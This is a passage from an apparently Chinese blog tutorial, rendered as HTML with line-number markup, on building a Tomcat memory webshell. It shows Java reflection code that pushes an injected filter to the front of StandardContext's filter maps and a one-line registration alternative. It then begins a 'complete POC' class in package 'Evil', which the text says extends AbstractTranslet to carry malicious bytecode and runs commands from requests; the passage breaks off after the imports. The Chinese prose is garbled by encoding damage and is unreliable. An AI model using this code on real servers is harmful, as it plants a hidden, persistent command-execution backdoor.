</span><span style="white-space:pre;-webkit-user-select:none;user-select:none;margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#727272">15
</span><span style="white-space:pre;-webkit-user-select:none;user-select:none;margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#727272">16
</span><span style="white-space:pre;-webkit-user-select:none;user-select:none;margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#727272">17
</span><span style="white-space:pre;-webkit-user-select:none;user-select:none;margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#727272">18
</span><span style="white-space:pre;-webkit-user-select:none;user-select:none;margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#727272">19
</span><span style="white-space:pre;-webkit-user-select:none;user-select:none;margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#727272">20
</span><span style="white-space:pre;-webkit-user-select:none;user-select:none;margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#727272">21
</span><span style="white-space:pre;-webkit-user-select:none;user-select:none;margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#727272">22
</span><span style="white-space:pre;-webkit-user-select:none;user-select:none;margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#727272">23
</span><span style="white-space:pre;-webkit-user-select:none;user-select:none;margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#727272">24
</span><span style="white-space:pre;-webkit-user-select:none;user-select:none;margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#727272">25
</span><span style="white-space:pre;-webkit-user-select:none;user-select:none;margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#727272">26
</span><span style="white-space:pre;-webkit-user-select:none;user-select:none;margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#727272">27
</span><span style="white-space:pre;-webkit-user-select:none;user-select:none;margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#727272">28
</span><span style="white-space:pre;-webkit-user-select:none;user-select:none;margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#727272">29
</span><span style="white-space:pre;-webkit-user-select:none;user-select:none;margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#727272">30
</span><span style="white-space:pre;-webkit-user-select:none;user-select:none;margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#727272">31
</span></code></pre></td>
<td style="vertical-align:top;padding:0;margin:0;border:0;;width:100%">
<pre tabindex="0" style="color:#e5e5e5;background-color:#000;-moz-tab-size:4;-o-tab-size:4;tab-size:4;"><code class="language-java" data-lang="java"><span style="display:flex;"><span><span style="color:#007f7f">/**
</span></span></span><span style="display:flex;"><span><span style="color:#007f7f"> * å°†æˆ‘ä»¬çš„ filtermap æ’å…¥åˆ°æœ€å‰é¢
</span></span></span><span style="display:flex;"><span><span style="color:#007f7f"> */</span>
</span></span><span style="display:flex;"><span>Class ccc = <span style="color:#fff;font-weight:bold">null</span>;
</span></span><span style="display:flex;"><span><span style="color:#fff;font-weight:bold">try</span> {
</span></span><span style="display:flex;"><span>    ccc = Class.<span style="color:#007f7f">forName</span>(<span style="color:#0ff;font-weight:bold">&#34;org.apache.tomcat.util.descriptor.web.FilterMap&#34;</span>);
</span></span><span style="display:flex;"><span>} <span style="color:#fff;font-weight:bold">catch</span> (Throwable t){}
</span></span><span style="display:flex;"><span><span style="color:#fff;font-weight:bold">if</span> (ccc == <span style="color:#fff;font-weight:bold">null</span>) {
</span></span><span style="display:flex;"><span>    <span style="color:#fff;font-weight:bold">try</span> {
</span></span><span style="display:flex;"><span>        ccc = Class.<span style="color:#007f7f">forName</span>(<span style="color:#0ff;font-weight:bold">&#34;org.apache.catalina.deploy.FilterMap&#34;</span>);
</span></span><span style="display:flex;"><span>    } <span style="color:#fff;font-weight:bold">catch</span> (Throwable t){}
</span></span><span style="display:flex;"><span>}
</span></span><span style="display:flex;"><span><span style="color:#007f7f">//æŠŠfilteræ’åˆ°ç¬¬ä¸€ä½
</span></span></span><span style="display:flex;"><span><span style="color:#007f7f"></span>java.<span style="color:#007f7f">lang</span>.<span style="color:#007f7f">reflect</span>.<span style="color:#007f7f">Method</span> m = Class.<span style="color:#007f7f">forName</span>(<span style="color:#0ff;font-weight:bold">&#34;org.apache.catalina.core.StandardContext&#34;</span>)
</span></span><span style="display:flex;"><span>        .<span style="color:#007f7f">getDeclaredMethod</span>(<span style="color:#0ff;font-weight:bold">&#34;findFilterMaps&#34;</span>);
</span></span><span style="display:flex;"><span>Object[] filterMaps = (Object[]) m.<span style="color:#007f7f">invoke</span>(standardContext);
</span></span><span style="display:flex;"><span>Object[] tmpFilterMaps = <span style="color:#fff;font-weight:bold">new</span> Object[filterMaps.<span style="color:#007f7f">length</span>];
</span></span><span style="display:flex;"><span><span style="color:#fff;font-weight:bold">int</span> index = <span style="color:#ff0;font-weight:bold">1</span>;
</span></span><span style="display:flex;"><span><span style="color:#fff;font-weight:bold">for</span> (<span style="color:#fff;font-weight:bold">int</span> i = <span style="color:#ff0;font-weight:bold">0</span>; i &lt; filterMaps.<span style="color:#007f7f">length</span>; i++) {
</span></span><span style="display:flex;"><span>    Object o = filterMaps[i];
</span></span><span style="display:flex;"><span>    m = ccc.<span style="color:#007f7f">getMethod</span>(<span style="color:#0ff;font-weight:bold">&#34;getFilterName&#34;</span>);
</span></span><span style="display:flex;"><span>    String name = (String) m.<span style="color:#007f7f">invoke</span>(o);
</span></span><span style="display:flex;"><span>    <span style="color:#fff;font-weight:bold">if</span> (name.<span style="color:#007f7f">equalsIgnoreCase</span>(FILTER_NAME)) {
</span></span><span style="display:flex;"><span>        tmpFilterMaps[<span style="color:#ff0;font-weight:bold">0</span>] = o;
</span></span><span style="display:flex;"><span>    } <span style="color:#fff;font-weight:bold">else</span> {
</span></span><span style="display:flex;"><span>        tmpFilterMaps[index++] = filterMaps[i];
</span></span><span style="display:flex;"><span>    }
</span></span><span style="display:flex;"><span>}
</span></span><span style="display:flex;"><span><span style="color:#fff;font-weight:bold">for</span> (<span style="color:#fff;font-weight:bold">int</span> i = <span style="color:#ff0;font-weight:bold">0</span>; i &lt; filterMaps.<span style="color:#007f7f">length</span>; i++) {
</span></span><span style="display:flex;"><span>    filterMaps[i] = tmpFilterMaps[i];
</span></span><span style="display:flex;"><span>}
</span></span></code></pre></td></tr></table>
</div>
</div><p>å…¶å®è¿™æ­¥éª¤ä¹Ÿæ˜¯å¯ä»¥ä¸è¦çš„,å› ä¸ºæˆ‘ä»¬åœ¨<code>addMappingForUrlPatterns(EnumSet&lt;DispatcherType&gt; dispatcherTypes, boolean isMatchAfter, String... urlPatterns)</code>æ–¹æ³•é‡Œé¢ï¼Œæˆ‘ä»¬åªè¦ä¼ å…¥çš„<code>isMatchAfter</code>ä¸º<code>false</code>ï¼Œé‚£ä¹ˆæˆ‘ä»¬å®é™…ä¸Šå°±å¯ä»¥ç›´æ¥è°ƒç”¨<code>addFilterMapBefore</code>æ–¹æ³•ï¼Œå°†filterMapæ”¾åˆ°filterMapsçš„æœ€å‰é¢ã€‚</p>
<p><img loading="lazy" src="https://cnblog-img-reus09.oss-cn-beijing.aliyuncs.com/imageimage-20230417152411831.png" alt="image-20230417152411831"  />
</p>
<div class="highlight"><div style="color:#e5e5e5;background-color:#000;-moz-tab-size:4;-o-tab-size:4;tab-size:4;">
<table style="border-spacing:0;padding:0;margin:0;border:0;"><tr><td style="vertical-align:top;padding:0;margin:0;border:0;">
<pre tabindex="0" style="color:#e5e5e5;background-color:#000;-moz-tab-size:4;-o-tab-size:4;tab-size:4;"><code><span style="white-space:pre;-webkit-user-select:none;user-select:none;margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#727272">1
</span><span style="white-space:pre;-webkit-user-select:none;user-select:none;margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#727272">2
</span></code></pre></td>
<td style="vertical-align:top;padding:0;margin:0;border:0;;width:100%">
<pre tabindex="0" style="color:#e5e5e5;background-color:#000;-moz-tab-size:4;-o-tab-size:4;tab-size:4;"><code class="language-java" data-lang="java"><span style="display:flex;"><span><span style="color:#007f7f">// è®¾ç½®åŸºæœ¬çš„url pattern, å¹¶ä¸”æ³¨å†ŒfilterMapï¼Œè®¾ç½®isMatchAfterä¸ºfalse,æ‰§è¡ŒaddFilterMapBeforeæ–¹æ³•ï¼Œä½¿filterMapæ’å…¥çš„æ—¶å€™åœ¨æœ€å‰é¢ã€‚
</span></span></span><span style="display:flex;"><span><span style="color:#007f7f"></span>filterRegistration.<span style="color:#007f7f">addMappingForUrlPatterns</span>(java.<span style="color:#007f7f">util</span>.<span style="color:#007f7f">EnumSet</span>.<span style="color:#007f7f">of</span>(javax.<span style="color:#007f7f">servlet</span>.<span style="color:#007f7f">DispatcherType</span>.<span style="color:#007f7f">REQUEST</span>),<span style="color:#fff;font-weight:bold">false</span>,<span style="color:#fff;font-weight:bold">new</span> String[]{FILTER_URL_PATTERN});
</span></span></code></pre></td></tr></table>
</div>
</div><p>æœ€åæ­¥éª¤äºŒçš„å®Œæ•´POCä»£ç å¦‚ä¸‹ï¼š</p>
<p>ç»§æ‰¿äº†<code>AbstractTranslet</code>ç±»(æºå¸¦æ¶æ„å­—èŠ‚ç åˆ°æœåŠ¡ç«¯åŠ è½½æ‰§è¡Œ)ï¼ŒåŒæ—¶å®ç°äº†<code>Filter</code>æ¥å£ï¼Œä½œä¸ºè‡ªå®šä¹‰çš„Filterï¼Œåœ¨å®ƒçš„<code>doFilter</code>æ–¹æ³•ä¸­ï¼Œå¯¹ä¼ å…¥çš„å‘½ä»¤å‚æ•°æ‰§è¡Œå‘½ä»¤ã€‚</p>
<div class="highlight"><div style="color:#e5e5e5;background-color:#000;-moz-tab-size:4;-o-tab-size:4;tab-size:4;">
<table style="border-spacing:0;padding:0;margin:0;border:0;"><tr><td style="vertical-align:top;padding:0;margin:0;border:0;">
<pre tabindex="0" style="color:#e5e5e5;background-color:#000;-moz-tab-size:4;-o-tab-size:4;tab-size:4;"><code><span style="white-space:pre;-webkit-user-select:none;user-select:none;margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#727272">  1
</span><span style="white-space:pre;-webkit-user-select:none;user-select:none;margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#727272">  2
</span><span style="white-space:pre;-webkit-user-select:none;user-select:none;margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#727272">  3
</span><span style="white-space:pre;-webkit-user-select:none;user-select:none;margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#727272">  4
</span><span style="white-space:pre;-webkit-user-select:none;user-select:none;margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#727272">  5
</span><span style="white-space:pre;-webkit-user-select:none;user-select:none;margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#727272">  6
</span><span style="white-space:pre;-webkit-user-select:none;user-select:none;margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#727272">  7
</span><span style="white-space:pre;-webkit-user-select:none;user-select:none;margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#727272">  8
</span><span style="white-space:pre;-webkit-user-select:none;user-select:none;margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#727272">  9
</span><span style="white-space:pre;-webkit-user-select:none;user-select:none;margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#727272"> 10
</span><span style="white-space:pre;-webkit-user-select:none;user-select:none;margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#727272"> 11
</span><span style="white-space:pre;-webkit-user-select:none;user-select:none;margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#727272"> 12
</span><span style="white-space:pre;-webkit-user-select:none;user-select:none;margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#727272"> 13
</span><span style="white-space:pre;-webkit-user-select:none;user-select:none;margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#727272"> 14
</span><span style="white-space:pre;-webkit-user-select:none;user-select:none;margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#727272"> 15
</span><span style="white-space:pre;-webkit-user-select:none;user-select:none;margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#727272"> 16
</span><span style="white-space:pre;-webkit-user-select:none;user-select:none;margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#727272"> 17
</span><span style="white-space:pre;-webkit-user-select:none;user-select:none;margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#727272"> 18
</span><span style="white-space:pre;-webkit-user-select:none;user-select:none;margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#727272"> 19
</span><span style="white-space:pre;-webkit-user-select:none;user-select:none;margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#727272"> 20
</span><span style="white-space:pre;-webkit-user-select:none;user-select:none;margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#727272"> 21
</span><span style="white-space:pre;-webkit-user-select:none;user-select:none;margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#727272"> 22
</span><span style="white-space:pre;-webkit-user-select:none;user-select:none;margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#727272"> 23
</span><span style="white-space:pre;-webkit-user-select:none;user-select:none;margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#727272"> 24
</span><span style="white-space:pre;-webkit-user-select:none;user-select:none;margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#727272"> 25
</span><span style="white-space:pre;-webkit-user-select:none;user-select:none;margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#727272"> 26
</span><span style="white-space:pre;-webkit-user-select:none;user-select:none;margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#727272"> 27
</span><span style="white-space:pre;-webkit-user-select:none;user-select:none;margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#727272"> 28
</span><span style="white-space:pre;-webkit-user-select:none;user-select:none;margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#727272"> 29
</span><span style="white-space:pre;-webkit-user-select:none;user-select:none;margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#727272"> 30
</span><span style="white-space:pre;-webkit-user-select:none;user-select:none;margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#727272"> 31
</span><span style="white-space:pre;-webkit-user-select:none;user-select:none;margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#727272"> 32
</span><span style="white-space:pre;-webkit-user-select:none;user-select:none;margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#727272"> 33
</span><span style="white-space:pre;-webkit-user-select:none;user-select:none;margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#727272"> 34
</span><span style="white-space:pre;-webkit-user-select:none;user-select:none;margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#727272"> 35
</span><span style="white-space:pre;-webkit-user-select:none;user-select:none;margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#727272"> 36
</span><span style="white-space:pre;-webkit-user-select:none;user-select:none;margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#727272"> 37
</span><span style="white-space:pre;-webkit-user-select:none;user-select:none;margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#727272"> 38
</span><span style="white-space:pre;-webkit-user-select:none;user-select:none;margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#727272"> 39
</span><span style="white-space:pre;-webkit-user-select:none;user-select:none;margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#727272"> 40
</span><span style="white-space:pre;-webkit-user-select:none;user-select:none;margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#727272"> 41
</span><span style="white-space:pre;-webkit-user-select:none;user-select:none;margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#727272"> 42
</span><span style="white-space:pre;-webkit-user-select:none;user-select:none;margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#727272"> 43
</span><span style="white-space:pre;-webkit-user-select:none;user-select:none;margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#727272"> 44
</span><span style="white-space:pre;-webkit-user-select:none;user-select:none;margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#727272"> 45
</span><span style="white-space:pre;-webkit-user-select:none;user-select:none;margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#727272"> 46
</span><span style="white-space:pre;-webkit-user-select:none;user-select:none;margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#727272"> 47
</span><span style="white-space:pre;-webkit-user-select:none;user-select:none;margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#727272"> 48
</span><span style="white-space:pre;-webkit-user-select:none;user-select:none;margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#727272"> 49
</span><span style="white-space:pre;-webkit-user-select:none;user-select:none;margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#727272"> 50
</span><span style="white-space:pre;-webkit-user-select:none;user-select:none;margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#727272"> 51
</span><span style="white-space:pre;-webkit-user-select:none;user-select:none;margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#727272"> 52
</span><span style="white-space:pre;-webkit-user-select:none;user-select:none;margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#727272"> 53
</span><span style="white-space:pre;-webkit-user-select:none;user-select:none;margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#727272"> 54
</span><span style="white-space:pre;-webkit-user-select:none;user-select:none;margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#727272"> 55
</span><span style="white-space:pre;-webkit-user-select:none;user-select:none;margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#727272"> 56
</span><span style="white-space:pre;-webkit-user-select:none;user-select:none;margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#727272"> 57
</span><span style="white-space:pre;-webkit-user-select:none;user-select:none;margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#727272"> 58
</span><span style="white-space:pre;-webkit-user-select:none;user-select:none;margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#727272"> 59
</span><span style="white-space:pre;-webkit-user-select:none;user-select:none;margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#727272"> 60
</span><span style="white-space:pre;-webkit-user-select:none;user-select:none;margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#727272"> 61
</span><span style="white-space:pre;-webkit-user-select:none;user-select:none;margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#727272"> 62
</span><span style="white-space:pre;-webkit-user-select:none;user-select:none;margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#727272"> 63
</span><span style="white-space:pre;-webkit-user-select:none;user-select:none;margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#727272"> 64
</span><span style="white-space:pre;-webkit-user-select:none;user-select:none;margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#727272"> 65
</span><span style="white-space:pre;-webkit-user-select:none;user-select:none;margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#727272"> 66
</span><span style="white-space:pre;-webkit-user-select:none;user-select:none;margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#727272"> 67
</span><span style="white-space:pre;-webkit-user-select:none;user-select:none;margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#727272"> 68
</span><span style="white-space:pre;-webkit-user-select:none;user-select:none;margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#727272"> 69
</span><span style="white-space:pre;-webkit-user-select:none;user-select:none;margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#727272"> 70
</span><span style="white-space:pre;-webkit-user-select:none;user-select:none;margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#727272"> 71
</span><span style="white-space:pre;-webkit-user-select:none;user-select:none;margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#727272"> 72
</span><span style="white-space:pre;-webkit-user-select:none;user-select:none;margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#727272"> 73
</span><span style="white-space:pre;-webkit-user-select:none;user-select:none;margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#727272"> 74
</span><span style="white-space:pre;-webkit-user-select:none;user-select:none;margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#727272"> 75
</span><span style="white-space:pre;-webkit-user-select:none;user-select:none;margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#727272"> 76
</span><span style="white-space:pre;-webkit-user-select:none;user-select:none;margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#727272"> 77
</span><span style="white-space:pre;-webkit-user-select:none;user-select:none;margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#727272"> 78
</span><span style="white-space:pre;-webkit-user-select:none;user-select:none;margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#727272"> 79
</span><span style="white-space:pre;-webkit-user-select:none;user-select:none;margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#727272"> 80
</span><span style="white-space:pre;-webkit-user-select:none;user-select:none;margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#727272"> 81
</span><span style="white-space:pre;-webkit-user-select:none;user-select:none;margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#727272"> 82
</span><span style="white-space:pre;-webkit-user-select:none;user-select:none;margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#727272"> 83
</span><span style="white-space:pre;-webkit-user-select:none;user-select:none;margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#727272"> 84
</span><span style="white-space:pre;-webkit-user-select:none;user-select:none;margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#727272"> 85
</span><span style="white-space:pre;-webkit-user-select:none;user-select:none;margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#727272"> 86
</span><span style="white-space:pre;-webkit-user-select:none;user-select:none;margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#727272"> 87
</span><span style="white-space:pre;-webkit-user-select:none;user-select:none;margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#727272"> 88
</span><span style="white-space:pre;-webkit-user-select:none;user-select:none;margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#727272"> 89
</span><span style="white-space:pre;-webkit-user-select:none;user-select:none;margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#727272"> 90
</span><span style="white-space:pre;-webkit-user-select:none;user-select:none;margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#727272"> 91
</span><span style="white-space:pre;-webkit-user-select:none;user-select:none;margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#727272"> 92
</span><span style="white-space:pre;-webkit-user-select:none;user-select:none;margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#727272"> 93
</span><span style="white-space:pre;-webkit-user-select:none;user-select:none;margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#727272"> 94
</span><span style="white-space:pre;-webkit-user-select:none;user-select:none;margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#727272"> 95
</span><span style="white-space:pre;-webkit-user-select:none;user-select:none;margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#727272"> 96
</span><span style="white-space:pre;-webkit-user-select:none;user-select:none;margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#727272"> 97
</span><span style="white-space:pre;-webkit-user-select:none;user-select:none;margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#727272"> 98
</span><span style="white-space:pre;-webkit-user-select:none;user-select:none;margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#727272"> 99
</span><span style="white-space:pre;-webkit-user-select:none;user-select:none;margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#727272">100
</span><span style="white-space:pre;-webkit-user-select:none;user-select:none;margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#727272">101
</span><span style="white-space:pre;-webkit-user-select:none;user-select:none;margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#727272">102
</span><span style="white-space:pre;-webkit-user-select:none;user-select:none;margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#727272">103
</span><span style="white-space:pre;-webkit-user-select:none;user-select:none;margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#727272">104
</span><span style="white-space:pre;-webkit-user-select:none;user-select:none;margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#727272">105
</span><span style="white-space:pre;-webkit-user-select:none;user-select:none;margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#727272">106
</span><span style="white-space:pre;-webkit-user-select:none;user-select:none;margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#727272">107
</span><span style="white-space:pre;-webkit-user-select:none;user-select:none;margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#727272">108
</span><span style="white-space:pre;-webkit-user-select:none;user-select:none;margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#727272">109
</span><span style="white-space:pre;-webkit-user-select:none;user-select:none;margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#727272">110
</span><span style="white-space:pre;-webkit-user-select:none;user-select:none;margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#727272">111
</span><span style="white-space:pre;-webkit-user-select:none;user-select:none;margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#727272">112
</span><span style="white-space:pre;-webkit-user-select:none;user-select:none;margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#727272">113
</span><span style="white-space:pre;-webkit-user-select:none;user-select:none;margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#727272">114
</span><span style="white-space:pre;-webkit-user-select:none;user-select:none;margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#727272">115
</span><span style="white-space:pre;-webkit-user-select:none;user-select:none;margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#727272">116
</span><span style="white-space:pre;-webkit-user-select:none;user-select:none;margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#727272">117
</span><span style="white-space:pre;-webkit-user-select:none;user-select:none;margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#727272">118
</span><span style="white-space:pre;-webkit-user-select:none;user-select:none;margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#727272">119
</span><span style="white-space:pre;-webkit-user-select:none;user-select:none;margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#727272">120
</span><span style="white-space:pre;-webkit-user-select:none;user-select:none;margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#727272">121
</span><span style="white-space:pre;-webkit-user-select:none;user-select:none;margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#727272">122
</span><span style="white-space:pre;-webkit-user-select:none;user-select:none;margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#727272">123
</span><span style="white-space:pre;-webkit-user-select:none;user-select:none;margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#727272">124
</span><span style="white-space:pre;-webkit-user-select:none;user-select:none;margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#727272">125
</span><span style="white-space:pre;-webkit-user-select:none;user-select:none;margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#727272">126
</span><span style="white-space:pre;-webkit-user-select:none;user-select:none;margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#727272">127
</span><span style="white-space:pre;-webkit-user-select:none;user-select:none;margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#727272">128
</span><span style="white-space:pre;-webkit-user-select:none;user-select:none;margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#727272">129
</span><span style="white-space:pre;-webkit-user-select:none;user-select:none;margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#727272">130
</span><span style="white-space:pre;-webkit-user-select:none;user-select:none;margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#727272">131
</span><span style="white-space:pre;-webkit-user-select:none;user-select:none;margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#727272">132
</span><span style="white-space:pre;-webkit-user-select:none;user-select:none;margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#727272">133
</span><span style="white-space:pre;-webkit-user-select:none;user-select:none;margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#727272">134
</span><span style="white-space:pre;-webkit-user-select:none;user-select:none;margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#727272">135
</span><span style="white-space:pre;-webkit-user-select:none;user-select:none;margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#727272">136
</span><span style="white-space:pre;-webkit-user-select:none;user-select:none;margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#727272">137
</span><span style="white-space:pre;-webkit-user-select:none;user-select:none;margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#727272">138
</span><span style="white-space:pre;-webkit-user-select:none;user-select:none;margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#727272">139
</span><span style="white-space:pre;-webkit-user-select:none;user-select:none;margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#727272">140
</span><span style="white-space:pre;-webkit-user-select:none;user-select:none;margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#727272">141
</span><span style="white-space:pre;-webkit-user-select:none;user-select:none;margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#727272">142
</span><span style="white-space:pre;-webkit-user-select:none;user-select:none;margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#727272">143
</span><span style="white-space:pre;-webkit-user-select:none;user-select:none;margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#727272">144
</span><span style="white-space:pre;-webkit-user-select:none;user-select:none;margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#727272">145
</span></code></pre></td>
<td style="vertical-align:top;padding:0;margin:0;border:0;;width:100%">
<pre tabindex="0" style="color:#e5e5e5;background-color:#000;-moz-tab-size:4;-o-tab-size:4;tab-size:4;"><code class="language-java" data-lang="java"><span style="display:flex;"><span><span style="color:#fff;font-weight:bold">package</span> Evil;
</span></span><span style="display:flex;"><span>
</span></span><span style="display:flex;"><span><span style="color:#fff;font-weight:bold">import</span> com.sun.org.apache.xalan.internal.xsltc.DOM;
</span></span><span style="display:flex;"><span><span style="color:#fff;font-weight:bold">import</span> com.sun.org.apache.xalan.internal.xsltc.TransletException;
</span></span><span style="display:flex;"><span><span style="color:#fff;font-weight:bold">import</span> com.sun.org.apache.xalan.internal.xsltc.runtime.AbstractTranslet;
